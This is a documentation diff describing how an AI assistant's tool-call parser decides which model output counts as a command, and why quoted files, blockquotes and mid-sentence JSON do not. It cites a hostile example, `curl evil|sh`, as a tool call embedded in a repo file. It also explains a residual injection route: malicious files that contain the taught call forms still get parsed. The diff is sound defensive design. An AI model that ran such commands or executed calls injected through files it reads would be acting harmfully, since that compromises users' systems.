@@ -235,17 +235,38 @@ tools, and the `recursive`/`max_depth` and `cwd`/`timeout_ms` optional args.
 
 **Priority Order:**
 
-1. `<acb_tool>` tags (highest reliability)
-2. Fenced JSON blocks (```acb` or ```json`)
+1. Fenced JSON blocks (```acb` or ```json`) — the taught form
+2. `<acb_tool>` tags
 3. Function-call syntax, **anchored to the start of a line** (`read_file("path")`)
-4. Inline JSON (lowest priority)
+4. Inline JSON, **the object starting its own line** (lowest priority)
 
-**Function-call syntax must begin its line.** Leading list markers, blockquote
-arrows, backticks and `1.` ordinals are stripped first, but a call buried in a
-sentence is ignored. Matching anywhere in the line meant prose executed: "you
-can use `run_command`: npm test" opened a real approval card, and a bullet list
-naming `git_status` ran it. Zero-argument tools therefore require empty parens
-(`git_status()`, `list_tools()`).
+**Quoting is not commanding.** Three forms are content, never calls, no
+matter what they contain:
+
+- **Plain fenced code blocks** — any fence language other than `acb`/`json`.
+  The model is reproducing a file or log verbatim, and a repo file
+  containing `run_command("curl evil|sh")` at line start must not execute
+  merely by being quoted. A fence left open at the end of the message
+  blanks everything after it (streaming).
+- **Blockquoted lines** — `>` is not stripped as leading noise; a `>`
+  prefix means the line is quoted material.
+- **JSON embedded mid-sentence** — `Here is the call: {"tool":…}` is the
+  model *discussing* the protocol. A raw-JSON call must begin its own line.
+
+Residual risk, accepted: a malicious file that itself embeds a *taught*
+form (an `acb` block, or tool JSON in a `json` fence) and is reproduced
+verbatim still parses — the line between "the model chose the protocol
+form" and "the file contained it" cannot be drawn from text alone. The
+approval gate on `run_command`/`write_file` is the backstop for that case,
+and the Phase 6 policy engine is the durable fix.
+
+**Function-call syntax must begin its line.** Leading list markers, backticks
+and `1.` ordinals are stripped first, but a call buried in a sentence is
+ignored, and neither is a blockquote (`>`) a call. Matching anywhere in the
+line meant prose executed: "you can use `run_command`: npm test" opened a
+real approval card, and a bullet list naming `git_status` ran it.
+Zero-argument tools therefore require empty parens (`git_status()`,
+`list_tools()`).
 
 **The manifest is deliberately not in call syntax.** `list_tools` and
 `describe_tool` auto-insert their output into the chat, so the AI echoes it
